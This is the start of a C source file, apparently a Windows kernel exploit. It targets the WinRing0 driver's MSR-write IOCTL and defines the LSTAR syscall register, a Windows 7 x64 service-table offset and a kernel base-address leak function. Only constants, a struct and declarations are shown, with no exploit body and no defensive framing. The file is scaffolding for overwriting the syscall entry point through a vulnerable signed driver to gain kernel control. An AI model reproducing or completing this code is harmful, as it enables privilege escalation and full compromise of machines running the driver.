#include <Windows.h>
#include <stdio.h>

#define TARGET_DEVICE "\\\\.\\GLOBALROOT\\Device\\\WinRing0_1_2_0"

#define SYSTEM_SERVICE_CALL_TABLE_OFFSET_WIN7SP1X64 0xA1580

#define SYSCALL_MSR 0xC0000082

// https://github.com/LibreHardwareMonitor/LibreHardwareMonitor/blob/master/WinRing0/OlsIoctl.h
#define OLS_TYPE 40000

// https://github.com/LibreHardwareMonitor/LibreHardwareMonitor/blob/master/WinRing0/OlsIoctl.h
#define IOCTL_OLS_WRITE_MSR CTL_CODE(OLS_TYPE, 0x822, METHOD_BUFFERED, FILE_ANY_ACCESS)

int main(int argc, char** argv);

unsigned long long leak_ntoskrnl_base_address();

// https://github.com/LibreHardwareMonitor/LibreHardwareMonitor/blob/master/WinRing0/OpenLibSys.h
typedef struct  _OLS_WRITE_MSR_INPUT {
	ULONG Register;
	ULARGE_INTEGER Value;
} OLS_WRITE_MSR_INPUT;